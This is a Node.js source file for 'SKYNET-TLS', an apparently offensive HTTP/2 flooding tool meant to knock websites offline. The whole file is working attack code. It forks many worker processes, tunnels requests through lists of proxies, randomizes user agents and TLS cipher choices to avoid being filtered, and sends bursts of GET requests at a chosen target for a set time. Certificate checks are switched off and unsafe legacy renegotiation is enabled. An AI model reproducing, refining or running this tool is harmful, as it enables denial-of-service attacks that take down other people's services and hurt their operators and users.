const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

process.on('uncaughtException', (exception) => {
    console.error(`Uncaught Exception: ${exception}`);
});

if (process.argv.length < 7) {
    console.log(`
    ███████╗██╗  ██╗██╗   ██╗███╗   ██╗███████╗████████╗
    ██╔════╝██║ ██╔╝╚██╗ ██╔╝████╗  ██║██╔════╝╚══██╔══╝
    ███████╗█████╔╝  ╚████╔╝ ██╔██╗ ██║█████╗     ██║  
    ╚════██║██╔═██╗   ╚██╔╝  ██║╚██╗██║██╔══╝     ██║   
    ███████║██║  ██╗   ██║   ██║ ╚████║███████╗   ██║   
    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝

  Usage: node SKYNET-TLS.js [TARGET] [TIME] [REQUEST] [THREAD] [PROXY FILE]
`);
    process.exit(1);
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").split(/\r?\n/);
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomInt(0, elements.length)];
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3], 10),
    rate: parseInt(process.argv[4], 10),
    threads: parseInt(process.argv[5], 10),
    proxyFile: process.argv[6]
};

const cplist = [
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
];

const cipher = randomElement(cplist);
const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 0);
}

class NetSocket {
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 10000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", (chunk) => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", (error) => {
            connection.destroy();
            return callback(undefined, `error: ${error.message}`);
        });
    }
}

const Socker = new NetSocket();
const headers = {
    ":method": "GET",
    ":path": parsedTarget.path,
    ":scheme": "https",
    "accept": "/",
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate",
    "cache-control": "no-cache",
    "upgrade-insecure-requests": "1"
};

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const userAgent = new UserAgent().toString();
    headers[":authority"] = parsedTarget.host;
    headers["user-agent"] = userAgent;

    const proxyOptions = {
        host: parsedProxy[0],
        port: parseInt(parsedProxy[1], 10),
        address: `${parsedTarget.host}:443`,
        timeout: 3
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            console.error(`Proxy error: ${error}`);
            return;
        }

        connection.setKeepAlive(true, 10000);

        const tlsOptions = {
            ALPNProtocols: ['h2', 'http/1.1'],
            ciphers: cipher,
            servername: parsedTarget.hostname,
            socket: connection,
            honorCipherOrder: true,
            ecdhCurve: "GREASE:X25519:x25519",
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION |
                           crypto.constants.SSL_OP_NO_TICKET |
                           crypto.constants.SSL_OP_NO_SSLv2 |
                           crypto.constants.SSL_OP_NO_SSLv3 |
                           crypto.constants.SSL_OP_NO_COMPRESSION |
                           crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                           crypto.constants.SSL_OP_TLSEXT_PADDING |
                           crypto.constants.SSL_OP_ALL,
            secure: true,
            rejectUnauthorized: false
        };

        const tlsConn = tls.connect(443, parsedTarget.hostname, tlsOptions);

        tlsConn.setKeepAlive(true, 10000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn
        });

        client.on("connect", () => {
            const intervalAttack = setInterval(() => {
                for (let i = 0; i < args.rate; i++) {
                    const request = client.request(headers);

                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });

                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("error", (error) => {
            console.error(`Client error: ${error}`);
            client.destroy();
            connection.destroy();
        });
    });
}

const killScript = () => process.exit(1);

setTimeout(killScript, args.time * 1000);